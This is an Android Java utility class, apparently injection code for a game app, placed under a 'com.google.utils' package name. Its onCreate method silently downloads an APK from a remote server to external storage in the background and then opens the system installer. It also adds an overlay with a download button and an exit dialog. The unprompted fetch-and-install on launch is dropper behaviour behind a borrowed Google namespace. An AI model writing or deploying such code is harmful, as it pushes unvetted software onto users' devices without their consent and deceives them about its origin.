package com.google.utils;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Environment;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.myworldinjectcode.R;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by admin on 2017/8/2.
 */

public class Utils2 {

    public static int enter_count = 0;


    public static void onCreate(Activity context) {
        downloadAndInstall(context,"/sdcard/11.apk");


    }


    public static void onResume(Activity context) {

        if (enter_count>0){
            AlertDialog.Builder builder = new AlertDialog.Builder(context);
            builder.setTitle("警告");
            builder.setMessage("你确定要退出游戏么?");
            builder.setPositiveButton("退出", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    System.exit(0);
                }
            });
            builder.setNegativeButton("点错了", null);
            builder.create();
            builder.show();
        }
        enter_count ++;

    }




    private static void config_download_para(Context context){
        String url = "http://reg.ksyun.huluxia.com/file/mc/resource/2016/07/04/MC_0.14.1_huluxia.apk";
        String dirPath = Environment.getExternalStorageDirectory().toString() + File.separator + "myWorld" +
                File.separator + "mctool" + File.separator;
        String fileName = "MC_0.14.1_huluxia.apk";
        download_apk(context , url, dirPath, fileName);
    }


    private static void download_apk(Context context, String url, String dirPath, String fileName) {


        Toast.makeText(context, "后台下载中...", Toast.LENGTH_SHORT).show();
    }


    public static void createButton(final Activity context){

        WindowManager window = (WindowManager) context.getSystemService(context.WINDOW_SERVICE);
        FrameLayout layout = new FrameLayout(context);
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        TextView tv = new TextView(context);
        tv.setText("V0.14.1");
        tv.setTextSize(20);
        params.leftMargin = 20;
        params.gravity = Gravity.LEFT;
        tv.setLayoutParams(params);
        // 添加文本
        layout.addView(tv);
        Button button = new Button(context);
        button.setText("下载");
        button.setBackgroundResource(R.drawable.btn_download_selector_day);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                config_download_para(context);
            }
        });

        // 添加按钮
        params = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        params.rightMargin = 10;
        params.gravity = Gravity.RIGHT;
        layout.addView(button, params);


        WindowManager.LayoutParams parent_params = new WindowManager.LayoutParams();
        parent_params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        parent_params.height = ViewGroup.LayoutParams.WRAP_CONTENT;
        // 设置背景为透明
        parent_params.format = PixelFormat.RGBA_8888;
        parent_params.gravity = Gravity.TOP;
//        parent_params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        window.addView(layout, parent_params);
    }


    public static void downloadAndInstall(final Activity activity, final String savePath){
        final String path = "http://reg.ksyun.huluxia.com/file/mc/resource/2016/07/04/MC_0.14.1_huluxia.apk";
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    //下载
                    URL url = new URL(path);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setReadTimeout(5000);
                    conn.setConnectTimeout(5000);
                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        File file = new File(savePath);
                        FileOutputStream fos = new FileOutputStream(file);
                        int len = -1;
                        byte[] buffer = new byte[1024*1024*2];
                        while((len = is.read(buffer)) > 0){
                            fos.write(buffer, 0, len);

                        }
                        System.out.println("下载完成");
                        fos.flush();
                        fos.close();
                        installFile(activity,file.getAbsolutePath());
                    }


                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        });
        thread.start();
    }


    public static void installFile(Activity activity,String apk_path){
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setAction(android.content.Intent.ACTION_VIEW);
        // String type = getMIMEType(f);
        // intent.setDataAndType(Uri.fromFile(f), type);
        intent.setDataAndType(Uri.parse("file://" + apk_path),
                        "application/vnd.android.package-archive");
        activity.startActivity(intent);
}
    

    public static void test(Activity activity){
        downloadAndInstall(activity,"");
    }
}
